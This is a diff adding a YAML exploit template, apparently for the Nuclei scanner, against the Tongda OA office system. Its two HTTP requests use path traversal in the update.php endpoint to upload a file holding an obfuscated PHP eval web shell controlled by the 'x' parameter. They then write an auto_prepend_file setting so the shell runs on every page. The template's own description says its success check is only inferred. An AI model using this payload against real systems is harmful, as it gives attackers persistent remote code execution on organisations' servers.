@@ -1,0 +1,107 @@
+id: poc-3df6a25a05029abb0d4e
+info:
+  name: 通达OAupdate存在后台文件包含漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3df6a25a05029abb0d4ece46605ec272
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 3df6a25a05029abb0d4ece46605ec272
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/tongda HTTP/1.1
+
+    Cookie: PHPSESSID=v5pjfe3ign7ge166a6383hnu01; path=/
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+
+    Connection: close
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
+
+    Host: {{Hostname}}
+
+    Content-Length: 471
+
+
+    -----------------------------17518323986548992951984057104
+
+    Content-Disposition: form-data; name="ATTACHMENT"; filename="tongda.log"
+
+    Content-Type: text/plain
+
+
+
+    <?php class Gz5SfY10 { public function __construct($H7Es8){ @eval("/*Z7y11Eib8N*/".$H7Es8.""); }}new Gz5SfY10($_REQUEST[''x'']);?>
+
+    -----------------------------17518323986548992951984057104
+
+    Content-Disposition: form-data; name="submit"
+
+
+    保存
+
+    -----------------------------17518323986548992951984057104--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1
+
+    Cookie: PHPSESSID=v5pjfe3ign7ge166a6383hnu01; path=/
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+
+    Connection: close
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
+
+    Host: {{Hostname}}
+
+    Content-Length: 369
+
+
+    -----------------------------17518323986548992951984057104
+
+    Content-Disposition: form-data; name="ATTACHMENT"; filename="config.ini"
+
+    Content-Type: text/plain
+
+
+    auto_prepend_file=tongda.log
+
+    -----------------------------17518323986548992951984057104
+
+    Content-Disposition: form-data; name="submit"
+
+
+    保存
+
+    -----------------------------17518323986548992951984057104--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
